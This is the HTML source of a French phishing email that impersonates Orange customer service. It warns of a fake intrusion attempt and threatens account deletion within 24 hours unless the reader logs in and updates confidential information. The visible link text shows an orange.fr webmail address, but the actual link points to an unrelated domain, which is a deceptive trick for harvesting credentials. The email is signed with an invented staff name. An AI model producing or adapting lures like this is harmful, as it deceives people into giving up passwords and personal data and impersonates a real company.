<img src="http://c.mailforge.orange.fr/mailforge/27039/logo-orange.gif" alt="Orange" align="top" width="40" height="40"></p>
      <p>
      </p></td>
  </tr>
  <tr>
    <td colspan="2" height="17"><img src="http://c.mailforge.orange.fr/mailforge/27039/degrade-orange.gif" width="598" height="12">
<table width=680 align=center>
<head>
</head>
<table width="680" border="0" cellpadding="0" cellspacing="0">
<tr><td><img src="http://c.mailforge.orange.fr/mailforge/27039/visuel.jpg"></td></tr>
</table>
<tr>
<td colspan="1" valign="top"><!-- start ContentHeader --><table
width=75% border="0"
cellspacing="0" cellpadding="0">
</tr>
<BR><FONT face=Verdana size=2><strong><br><br>Ch&egrave;r client Orange</strong>,</FONT></P>
<P align=left><font  face=Arial size=2></FONT></P>
<P><font  face=Arial size=2>Attention !  
				 Tentative d'intrusion dans votre compte Orange!
                                Quelqu'un avec le IP address 149.225.126.87 a essay&eacute; d'acc&eacute;der &agrave; votre compte personnel!
                                Nous vous prions de bien vouloir vous connecter &agrave; votre compte Orange Et mettre a jour vos informations confidentielles ! 
                                Vous avez un d&eacute;lai de 24h pour r&eacute;tablir l'acc&egrave;s &agrave; votre compte sans ceux Ce dernier sera d&eacute;finitivement supprim&eacute;.<br>
				<br>
				
                                Vous pouvez &eacute;galement confirmer votre adresse email en vous connectant &agrave; votre compte Orange .</font></p>
				<p><b><font face="Arial" size="2">
				<a href="http://chriedu.com/">
				<font color="ff6600">
				  http://webmail15.orange.fr/s&eacute;curit&eacute;/fr_FR/inbox.html?PAGE=1</font></a></font></b></p>
				<p><font  face="Arial" size="2"><b>*Important*</b><br>
				Nous avons demand&eacute; quelques renseignements compl&eacute;mentaires, ce qui va &ecirc;tre le cadre de processus d'ouverture de session s&eacute;curis&eacute;. Ces informations compl&eacute;mentaires seront pos&eacute;es lors de votre connexion avenir pour la s&eacute;curit&eacute;, s'il vous pla&icirc;t fournir toutes les informations sur ces compl&egrave;tement et correctement autrement pour des raisons de s&eacute;curit&eacute; ,nous devons fermer votre compte temporairement.<br>
                                <br>
                                Nous vous remercions de votre prompte attention &agrave; cette question. S'il vous pla&icirc;t comprendre que cela est une mesure de s&eacute;curit&eacute; destin&eacute;e &agrave; vous aider et de prot&eacute;ger votre compte. Nous nous excusons pour tout inconv&eacute;nient.<br>
				<br>
&nbsp;</font></p>
				<p><font face="Arial" size="2"><font color="#003366"><b>Raphael 
				FAURE</b><br>
				<i>Service Orange Internet<br>
				Orange.fr</i></font><br>
&nbsp;</font></td>
			</tr>
		</table>
		<hr size="1">
		<p><font size="1" face="Arial" color="#808080">	
Email Orange n PP468 Protegez les informations concernant votre compte Veillez &agrave; ne jamais communiquer votre mot de passe &agrave; des sites frauduleux.<br>

		Orange Email ID # 1009</font></td>
	</tr>
	<tr>
		<td>&nbsp;</td>
	</tr>
</table>

</body>
</html>

